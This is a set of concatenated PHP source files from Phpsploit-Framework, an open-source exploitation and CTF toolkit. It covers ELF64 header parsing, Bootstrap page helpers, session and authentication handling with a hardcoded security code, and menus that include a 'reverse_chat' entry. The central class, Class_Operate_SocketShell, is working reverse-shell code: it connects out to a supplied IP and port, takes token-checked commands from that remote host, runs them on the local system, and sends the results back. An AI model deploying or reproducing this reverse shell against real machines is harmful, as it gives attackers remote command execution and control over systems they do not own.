        $this->p_offset = null;
        $this->p_vaddr  = null;
        $this->p_paddr  = null;
        $this->p_filesz = null;
        $this->p_memsz  = null;
        $this->p_align  = null;
    }

    public function get_p_type ()
    {
        if ( ( is_string ( $this->p_type ) ) && ( strlen ( $this->p_type ) == 4 ) ) {
            $_p_type = ( ( Class_Base_Elf::unpack ( substr ( $this->p_type , 0 , 4 ) , "V*" ) ) );
            return $_p_type;
        }
        return false;
    }

    public function get_p_flags ()
    {
        if ( ( is_string ( $this->p_flags ) ) && ( strlen ( $this->p_flags ) == 4 ) ) {
            $_p_flags = ( ( Class_Base_Elf::unpack ( substr ( $this->p_flags , 0 , 4 ) , "V*" ) ) );
            return $_p_flags;
        }
        return false;
    }

    public function get_p_offset ()
    {
        if ( ( is_string ( $this->p_offset ) ) && ( strlen ( $this->p_offset ) == 8 ) ) {
            $_p_offset = ( ( Class_Base_Elf::unpack ( substr ( $this->p_offset , 0 , 8 ) , "Q*" ) ) );
            return $_p_offset;
        }
        return false;
    }

    public function get_p_vaddr ()
    {
        if ( ( is_string ( $this->p_vaddr ) ) && ( strlen ( $this->p_vaddr ) == 8 ) ) {
            $_p_vaddr = ( ( Class_Base_Elf::unpack ( substr ( $this->p_vaddr , 0 , 8 ) , "Q*" ) ) );
            return $_p_vaddr;
        }
        return false;
    }

    public function get_p_paddr ()
    {
        if ( ( is_string ( $this->p_paddr ) ) && ( strlen ( $this->p_paddr ) == 8 ) ) {
            $_p_paddr = ( ( Class_Base_Elf::unpack ( substr ( $this->p_paddr , 0 , 8 ) , "Q*" ) ) );
            return $_p_paddr;
        }
        return false;
    }

    public function get_p_filesz ()
    {
        if ( ( is_string ( $this->p_filesz ) ) && ( strlen ( $this->p_filesz ) == 8 ) ) {
            $_p_filesz = ( ( Class_Base_Elf::unpack ( substr ( $this->p_filesz , 0 , 8 ) , "Q*" ) ) );
            return $_p_filesz;
        }
        return false;
    }

    public function get_p_memsz ()
    {
        if ( ( is_string ( $this->p_memsz ) ) && ( strlen ( $this->p_memsz ) == 8 ) ) {
            $_p_memsz = ( ( Class_Base_Elf::unpack ( substr ( $this->p_memsz , 0 , 8 ) , "Q*" ) ) );
            return $_p_memsz;
        }
        return false;
    }

    public function get_p_align ()
    {
        if ( ( is_string ( $this->p_align ) ) && ( strlen ( $this->p_align ) == 8 ) ) {
            $_p_align = ( ( Class_Base_Elf::unpack ( substr ( $this->p_align , 0 , 8 ) , "Q*" ) ) );
            return $_p_align;
        }
        return false;
    }

    public function get_format_program_header ()
    {
        $_format_program_header = array ();

        $_format_program_header[ "p_type" ]       = $this->get_p_type ();
        $_format_program_header[ "p_type_name" ]  = Class_Base_Elf::get_pt_type_name ( $this->get_p_type () );
        $_format_program_header[ "hex_p_type" ]   = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_type () ) );
        $_format_program_header[ "p_flags" ]      = $this->get_p_flags ();
        $_format_program_header[ "hex_p_flags" ]  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_flags () ) );
        $_format_program_header[ "p_offset" ]     = $this->get_p_offset ();
        $_format_program_header[ "hex_p_offset" ] = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_offset () ) );
        $_format_program_header[ "p_vaddr" ]      = $this->get_p_vaddr ();
        $_format_program_header[ "hex_p_vaddr" ]  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_vaddr () ) );
        $_format_program_header[ "p_paddr" ]      = $this->get_p_paddr ();
        $_format_program_header[ "hex_p_paddr" ]  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_paddr () ) );
        $_format_program_header[ "p_filesz" ]     = $this->get_p_filesz ();
        $_format_program_header[ "hex_p_filesz" ] = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_filesz () ) );
        $_format_program_header[ "p_memsz" ]      = $this->get_p_memsz ();
        $_format_program_header[ "hex_p_memsz" ]  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_memsz () ) );
        $_format_program_header[ "p_align" ]      = $this->get_p_align ();
        $_format_program_header[ "hex_p_align" ]  = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $this->get_p_align () ) );

        return $_format_program_header;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:03
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_SocketShell extends Class_Operate
{
    const EXCEPTION_MESSAGE_TOKEN_ERROR  = "token is error";
    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_socket             = null;
    private static $_max_connect_number = 0;

    public static function start ( $ip , $port , $max_connect_number = 1 , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        try {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Start , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient manager connect : " . $_SERVER[ "REMOTE_ADDR" ] . ":" . $_SERVER[ "REMOTE_PORT" ] . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "Shell Server is Start" );
            }
            self::create_token ( $connect_domain_List_id );
            Class_Base_Socket::init ( $max_execute_time );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\n" . 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) );
            }
            self::$_max_connect_number = $max_connect_number;
            self::$_socket             = Class_Base_Socket::create ();
            Class_Base_Socket::connect ( self::$_socket , $ip , $port );
            $token = self::get_token ();
            self::check_browser_service_stop ();
            $_clientinfo = Class_Base_Socket::getpeername ( self::$_socket );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\ncreate socket connection to server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "create socket connection to server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
            }
            while ( true ) {
                self::check_browser_service_stop ();
                $command = Class_Base_Socket::read ( self::$_socket , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                if ( ! empty( $command ) ) {
                    $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                    $request_info = explode ( " " , $command );
                    if ( count ( $request_info ) < 2 ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    $request_token = $request_info[ 0 ];
                    array_shift ( $request_info );
                    $command = implode ( " " , $request_info );
                    if ( $request_token != $token ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_TOKEN_ERROR , self::EXCEPTION_BREAK );
                    }
                    if ( $command == "quit" ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                    }
                    if ( $command == "exit" ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    if ( $command == chr ( 3 ) ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                    $_output        = Class_Base_Shell::command ( $command );
                    $_socket_output = self::array_split_to_string ( $_output );
                    Class_Base_Socket::write ( self::$_socket , $_socket_output , null );
                    if ( ! is_cli () ) {
                        $_web_output = self::array_to_js_inner_html_string ( $_output );
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nserver : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : " . "\n\n" . $_web_output ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        $_cli_output = $_socket_output;
                        Class_Base_Response::outputln ( "server : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : \n\n" . $_cli_output );
                    }
                }
                self::check_browser_service_stop ();
            }
        } catch ( \Exception $e ) {
            try {
                Class_Base_Socket::close ( self::$_socket );
            } catch ( \Exception $e ) {
            }
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Stop , server ip ( " . $_clientinfo[ "ip" ] . " ) , server port ( " . $_clientinfo[ "port" ] . " ) time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( ( "\nShell Server is Stop , server ip ( " . $_clientinfo[ "ip" ] . " ) , server port ( " . $_clientinfo[ "port" ] . " ) time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) );
            }
            if ( $e->getMessage () != self::EXCEPTION_MESSAGE_CONNECT_EXIT ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nexception message : " . $e->getMessage () . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\nexception message : " . $e->getMessage () . "\n" ) );
                }
            }
        }
    }

    public static function array_to_js_inner_html_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function array_split_to_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }

    public static function create_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_SESSION[ "SOCKET_SHELL_TOKEN" ] = md5 ( time () . rand ( 10000000 , 99999999 ) );
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . $_SESSION[ "SOCKET_SHELL_TOKEN" ] ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "token : " . $_SESSION[ "SOCKET_SHELL_TOKEN" ] . "\n" );
        }
    }

    public static function get_token ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SHELL_TOKEN" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SHELL_TOKEN" ];
    }

    public static function out_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . "\n" );
        }
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午10:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Dyn extends Class_Base
{
    const SIZE_D_TAG      = ( Class_Base_Elf64::SIZE_ELF64_SXWORD );
    const SIZE_D_UN_D_VAL = ( Class_Base_Elf64::SIZE_ELF64_WORD );
    const SIZE_D_UN_D_PTR = ( Class_Base_Elf64::SIZE_ELF64_ADDR );


    const PURPOSE_D_TAG      = "";
    const PURPOSE_D_UN_D_VAL = "";
    const PURPOSE_D_UN_D_PTR = "";

    private static $_dynamic    = array ();
    private static $_elf64_dyns = array ();

    public $d_tag = null;
    public $d_un  = null;


    public static function get_dyn_size ()
    {
        $_dyn_size = ( self::SIZE_D_TAG + self::SIZE_D_UN_D_PTR );
        return $_dyn_size;
    }

    public static function get_d_tag_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_d_un_offset ()
    {
        $_offset = ( self::get_d_tag_offset () + self::SIZE_D_TAG );
        return $_offset;
    }

    public static function create_elf64_dyn ( $filepath , $d_tag , $d_un )
    {
        self::$_elf64_dyns[ $filepath ] = new Class_Base_Elf64_Dyn( $d_tag , $d_un );
        self::$_dynamic[ $filepath ]    = self::$_elf64_dyns[ $filepath ];
    }

    public function __construct ( $d_tag , $d_un )
    {
        $this->d_tag = $d_tag;
        $this->d_un  = $d_un;

    }

    public function __destruct ()
    {
        $this->d_tag = null;
        $this->d_un  = null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午1:22
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Bootstrap extends Class_Base
{
    const DEFAULT_DOWNLOAD_PACKAGE_LINK    = "https://github.com/twbs/bootstrap/releases/download/v5.3.0-alpha3/bootstrap-5.3.0-alpha3-dist.zip";
    const DEFAULT_DOWNLOAD_SOURCE_LINK     = "https://github.com/twbs/bootstrap/archive/v5.3.0-alpha3.zip";
    const DEFAULT_DOWNLOAD_EXAMPLES_LINK   = "https://github.com/twbs/bootstrap/releases/download/v5.3.0-alpha3/bootstrap-5.3.0-alpha3-examples.zip";
    const DEFAULT_DOWNLOAD_JQUERY_LINK     = 'https://code.jquery.com/jquery-3.6.4.min.js';
    const DEFAULT_DOWNLOAD_JQUERY_MAP_LINK = 'https://code.jquery.com/jquery-3.6.4.min.map';
    const DEFAULT_JQUERY_GIT_CLONE         = 'https://github.com/jquery/jquery.git';
    const DEFAULT_BOOTSTRAP_GIT_CLONE      = "https://github.com/twbs/bootstrap.git";
    const DEFAULT_CSS_LABEL                = '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">';
    const DEFAULT_JS_LABEL                 = '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>';
    const DEFAULT_JQUERY_JS_LABEL          = '<script src=https://code.jquery.com/jquery-3.6.4.min.js"></script>';
    const DEFAULT_NPM_INSTALL              = 'npm install bootstrap@5.3.0-alpha3';
    const DEFAULT_GEM_INSTALL              = 'gem install bootstrap -v 5.3.0-alpha3';
    const DEFAULT_YARN_INSTALL             = 'yarn add bootstrap@5.3.0-alpha3';
    const DEFAULT_COMPOSER_INSTALL         = 'composer require twbs/bootstrap:5.3.0-alpha3';
    const DEFAULT_NU_GET_CSS_INSTALL       = 'Install-Package bootstrap';
    const DEFAULT_NU_GET_SASS_INSTALL      = 'Install-Package bootstrap.sass';
    const DEFAULT_CHARSET                  = "utf-8";

    public static function get_html_head ( $language = "en" , $charset = "utf-8" , $title = "phpsploit-framework" )
    {
        $_html = '<!doctype html><html lang="' . $language . '"><head><meta charset="' . $charset . '"><meta name="viewport" content="width=device-width, initial-scale=1"><title>' . $title . '</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous"><script src="https://code.jquery.com/jquery-3.6.4.min.js"></script></head><body><div class="container py-4 px-3 mx-auto">';
        return $_html;
    }

    public static function get_html_body ( $html_code )
    {
        $_html = $html_code;
        return $_html;
    }

    public static function get_html_foot ( $javascript_code )
    {
        $_html = '<script type="text/javascript">$(document).ready(function(){' . $javascript_code . '});</script></div><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script></body></html>';
        return $_html;
    }

    public static function get_html ( $head , $body , $foot )
    {
        $_html = $head . $body . $foot;
        return $_html;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Wget_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( ( ! isset( $params[ "wget" ] ) ) || ( ! is_array ( $params[ "wget" ] ) ) ) {
            $params[ "wget" ] = array ();
        }
        if ( ( ! isset( $params[ "wget" ][ "timeout" ] ) ) || ( ! is_integer ( $params[ "wget" ][ "timeout" ] ) ) ) {
            $params[ "wget" ][ "timeout" ] = 60;
        }
        if ( ( ! isset( $params[ "wget" ][ "display_progress" ] ) ) || ( ! is_integer ( $params[ "wget" ][ "display_progress" ] ) ) ) {
            $params[ "wget" ][ "display_progress" ] = 1;
        }
        if ( ( ! isset( $params[ "wget" ][ "file_url" ] ) ) || ( ! is_string ( $params[ "wget" ][ "file_url" ] ) ) ) {
            $params[ "wget" ][ "file_url" ] = "";
        }
        if ( ( ! isset( $params[ "wget" ][ "save_directory_path" ] ) ) || ( ! is_string ( $params[ "wget" ][ "save_directory_path" ] ) ) ) {
            $params[ "wget" ][ "save_directory_path" ] = "";
        }

        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "wget" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/wget" , array ( "timeout" => $params[ "wget" ][ "timeout" ] , "display_progress" => $params[ "wget" ][ "display_progress" ] , "file_url" => urlencode ( $params[ "wget" ][ "file_url" ] ) , "save_directory_path" => $params[ "wget" ][ "save_directory_path" ] , ) ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 上午9:22
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Auth extends Class_Base
{
    const SHM_KEY       = 100000000000000000;
    const SECURITY_CODE = '^1A69DvAk88$!;Radfs^#q0123456789';

    public static function create_password ()
    {
        $_password = "";
        for ( $i = 0 ; $i < 18 ; $i++ ) {
            $_password .= chr ( rand ( 33 , 126 ) );
        }
        return $_password;
    }

    public static function create_security_code ()
    {
        $_password = "";
        for ( $i = 0 ; $i < 18 ; $i++ ) {
            $_password .= chr ( rand ( 33 , 126 ) );
        }
        return $_password;
    }

    public static function is_enable_license_agreement ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! empty( $_SESSION ) ) && ( is_array ( $_SESSION ) ) && ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] ) ) && ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] == 1 ) ) {
            return true;
        }
        return false;
    }

    public static function enable_license_agreement ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
            $_SESSION = array ();
        }
        $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] = 1;
    }

    public static function disable_license_agreement ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
            $_SESSION = array ();
        }
        $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] = 0;
    }

    public static function is_login ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! empty( $_SESSION ) ) && ( is_array ( $_SESSION ) ) && ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] ) ) && ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] == 1 ) ) {
            if ( ! ( Class_Operate_User::exist_token () ) ) {
                $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] = null;
                unset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] );
                return false;
            }
            return true;
        }
        return false;
    }

    public static function enable_login ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
            $_SESSION = array ();
        }
        $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] = 1;
    }

    public static function disable_login ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
            $_SESSION = array ();
        }
        $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_LOGIN" ] = 0;
    }

    public static function clear_session ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( isset( $_SESSION ) ) {
            if ( is_array ( $_SESSION ) ) {
                foreach ( $_SESSION as $k => $v ) {
                    $_SESSION[ $k ] = null;
                    unset( $_SESSION[ $k ] );
                }
                if ( isset( $_COOKIE[ session_name () ] ) ) {
                    setcookie ( session_name () , '' , time () - 42000 , '/' );
                }
            }
            session_destroy ();
            $_SESSION = null;
            unset( $_SESSION );
        }
    }

    public static function clear ()
    {
        self::clear_session ();
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            Class_Base_Memory::clear ();
        }
    }

    public static function is_permission_csrf ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! empty( $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] ) ) && ( ! empty( $_REQUEST[ "csrf" ] ) ) && ( $_REQUEST[ "csrf" ] == $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] ) ) {
            return true;
        }
        return false;
    }

    public static function is_permission ()
    {
        if ( ( self::is_login () ) && ( self::is_permission_csrf () ) ) {
            return true;
        }
        return false;
    }

    public static function check_permission ()
    {
        if ( ( ! is_cli () ) && ( ! self::is_permission () ) ) {
            throw new \Exception( "Insufficient access permissions to perform this operation!" , 0 );
        }
    }

    public static function cli_show_license_agreement ()
    {
        if ( is_cli () ) {
            $_is_enable_license_agreement = Class_Base_Request::form ( "is_enable_license_agreement" , Class_Base_Request::TYPE_INTEGER , 0 );
            if ( empty( $_is_enable_license_agreement ) ) {
                Class_Base_Response::output ( "\n\n" . Class_View_Default::get_document_title () . "\n\n" . Class_View_Default::get_document_body () . "\n\n" . Class_View_Default::get_document_confirm () . "\n\n" . Class_View_Default::get_command_line_form_parameter_description () . "\n\n" );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Chat_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }

        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "server_chat" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/chat/server_chat" , array () ) ,
                ) ,
                array (
                    "title"    => "reverse_chat" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/chat/reverse_chat" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

